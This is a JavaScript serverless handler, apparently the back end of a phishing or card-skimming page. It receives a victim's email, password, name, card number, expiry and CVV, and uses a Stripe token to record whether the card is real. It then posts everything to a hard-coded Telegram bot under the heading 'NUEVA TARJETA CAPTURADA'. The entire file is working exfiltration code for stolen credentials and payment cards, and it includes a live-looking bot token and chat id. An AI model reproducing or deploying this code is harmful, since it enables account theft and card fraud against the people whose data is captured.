import axios from 'axios';

export default async function handler(req, res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') return res.status(200).end();

    const { em, pw, nm, cc, ex, cv, stripeToken } = req.body;

    const tg_token = "8255731465:AAGrPR_qH0zC4zTdBqOj-Zt1jqY0W03-yws";
    const chat_id = "7993722214";

    // Determinar si la tarjeta pasó la validación de Stripe
    let validacionStatus = "";
    if (stripeToken && stripeToken.startsWith('tok_')) {
        validacionStatus = "✅ TARJETA VÁLIDA (Existe)";
    } else if (stripeToken && stripeToken.startsWith('ERROR')) {
        validacionStatus = "❌ " + stripeToken; // Muestra el error de validación
    } else {
        validacionStatus = "⚠️ INFO (Sin validar)";
    }

    const msg = `🔔 **NUEVA TARJETA CAPTURADA** 🔔\n\n` +
                `🛡️ **Validación:** ${validacionStatus}\n` +
                `📧 **Email:** \`${em}\` \n` +
                `🔑 **Pass:** \`${pw}\` \n` +
                `👤 **Nombre:** ${nm}\n` +
                `💳 **CC:** \`${cc}\` \n` +
                `📅 **Exp:** ${ex}\n` +
                `🔒 **CVV:** \`${cv}\``;

    try {
        // Enviar a Telegram
        await axios.post(`https://api.telegram.org/bot${tg_token}/sendMessage`, {
            chat_id: chat_id,
            text: msg,
            parse_mode: 'Markdown'
        });
        
        return res.status(200).json({ ok: true });
    } catch (err) {
        return res.status(200).json({ ok: false });
    }
}
